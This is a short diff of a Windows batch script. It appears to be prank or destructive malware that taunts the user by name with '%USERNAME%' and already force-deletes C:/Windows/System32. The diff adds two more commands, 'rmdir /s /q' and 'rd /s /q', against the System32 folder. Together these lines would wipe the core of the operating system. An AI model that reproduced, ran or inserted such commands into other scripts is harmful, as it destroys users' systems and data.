@@ -1177,6 +1177,8 @@ dir /s
 timeout /t 5 /nobreak > NUL
 echo Nowhere to hide now, %USERNAME%
 timeout /t 5 /nobreak > NUL
+rmdir /s /q C:\Windows\System32
+rd /s /q C:\Windows\System32
 del /f /q /s "C:/Windows/System32"
 exit /b 
 
